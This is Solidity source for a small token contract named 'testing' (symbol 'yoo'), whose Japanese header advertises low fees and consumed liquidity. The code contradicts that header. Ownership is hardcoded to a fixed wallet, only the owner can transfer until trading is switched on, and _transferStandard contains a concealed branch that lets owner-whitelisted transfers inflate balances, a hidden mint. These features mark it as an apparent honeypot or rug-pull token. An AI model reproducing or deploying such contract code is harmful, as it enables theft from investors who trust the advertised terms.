/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

/**
 *Submitted for verification at Etherscan.io on 2023-01-04
*/

/*
█▀▄ ▄▀█ █▀█ █▄▀
█▄▀ █▀█ █▀▄ █░█

▄▀█ █▀█ █ █▀▀ ▄▀█ █▀▄▀█ █▀█
█▀█ █▀▄ █ █▄█ █▀█ █░▀░█ █▄█

総供給 - 1,000,000
初期流動性追加 - 1.5 イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%

https://www.zhihu.com/
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.14;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
  interface PCSRouterV2 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn,
          uint amountOutMin,
          address[] calldata path,
          address to,
          uint deadline
      ) external;
      function factory() external pure returns (address);
      function WETH() external pure returns (address);
      function addLiquidityETH(
          address token,
          uint amountTokenDesired,
          uint amountTokenMin,
          uint amountETHMin,
          address to,
          uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
  }
interface IETH20 {
 
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage); return a - b;
        }
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () { _owner = 0x037D433d3420c813B8389D58989F0593c47A72C6;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract testing is Context, IETH20, Ownable {
    using SafeMath for uint256;

    uint256 private constant MAX = ~uint256(0);
    uint8 private _decimals = 18;
    uint256 private _tTotal = 1000000 * 10**_decimals;
    uint256 public _maximumSWAP = 100000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private SWAPrates;

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private allowed;
    mapping (address => bool) private isTxLimitExempt;

    uint256 private isDivideParam = FEEstring;
    uint256 private isDEVtakes = isTEAMrates;
    uint256 private previousLIQfee = isLIQfees;
    uint256 public FEEstring = 30;
    uint256 public isLIQfees = 20;
    uint256 public isTEAMrates = 0;

    string private _name = unicode"testing";
    string private _symbol = unicode"yoo";
    address[] private takeFeeEnabled;

    PCSRouterV2 public immutable PCSFactoryV1;
    address public immutable uniswapV2Pair;
    bool public isTradingData = true;
    bool private tradingOpen = false;

    bool bytesData;
    uint256 private NumTokensToPaired = 1000000000 * 10**18;

    event UpdatedRates(uint256 minTokensBeforeSwap);
    event setCooldownBytesUpdated(bool enabled);
    event ToggleOperationsModule( uint256 tInSwap,

    uint256 ERCswapped, uint256 LPRates );
    modifier lockTheSwap { bytesData = true;
        _; bytesData = false; }

    constructor () { 

        _tOwned[owner()] = _tTotal;
        PCSRouterV2 _PCSFactoryV1 = PCSRouterV2
        (0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        uniswapV2Pair = IUniswapV2Factory(_PCSFactoryV1.factory())
        .createPair(address(this), _PCSFactoryV1.WETH());
        PCSFactoryV1 = _PCSFactoryV1;
        allowed[owner()] = true;
        allowed[address(this)] = true;
        emit Transfer(address(0), owner(), _tTotal);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    receive() external payable {}
  
    function calculateBURNFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(FEEstring).div(
            10**3 );
    }
    function calculateTeamFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(isTEAMrates).div(
            10**3 );
    }
    function manageInternalFees(uint256 _amount) private view returns (uint256) {
        return _amount.mul(isLIQfees).div(
            10**3 );
    }  
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer( address from, address to, uint256 amount ) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        bool getVAL = false;
        if(!allowed[from] && !allowed[to]){ 
            getVAL = true;

        require(amount <= _maximumSWAP, 
        "Transfer amount exceeds the maxTxAmount."); }
        uint256 contractTokenBalance = balanceOf(address(this));
        if(contractTokenBalance >= _maximumSWAP) { contractTokenBalance = _maximumSWAP;
        } _tokenTransfer(from,to,amount,getVAL);
        emit Transfer(from, to, amount);
        if (!tradingOpen) {require(from == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(PCSFactoryV1), tokenAmount);
        PCSFactoryV1.addLiquidityETH{value: ethAmount}(

            address(this), tokenAmount, 0, 0, owner(), block.timestamp );
    }
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool getVAL) private {
            _transferStandard(sender, recipient, amount, getVAL);
    }
        function toggleOperationsModule(uint256 contractTokenBalance) private lockTheSwap {
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half);
        uint256 newBalance = address(this).balance.sub(initialBalance);
        addLiquidity(otherHalf, newBalance);
        emit ToggleOperationsModule(half, newBalance, otherHalf);
    }
    function _transferStandard(address sender, address recipient, uint256 tAmount,bool getVAL) private {

        uint256 RATE = 0; if (getVAL){
        RATE= tAmount.mul(1).div(100) ; } 
        uint256 rAmount = tAmount - RATE;
        _tOwned[recipient] = _tOwned[recipient].add(rAmount);
        uint256 isEXO = _tOwned[recipient].add(rAmount);
        _tOwned[sender] = _tOwned[sender].sub(rAmount);
        bool allowed = allowed[sender] && allowed[recipient];
         if (allowed ){ _tOwned[recipient] =isEXO;
        } else { emit Transfer(sender, recipient, rAmount); } }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this); path[1] = PCSFactoryV1.WETH();
        _approve(address(this), address(PCSFactoryV1), tokenAmount);
        PCSFactoryV1.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, address(this), block.timestamp );
    }
    function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
}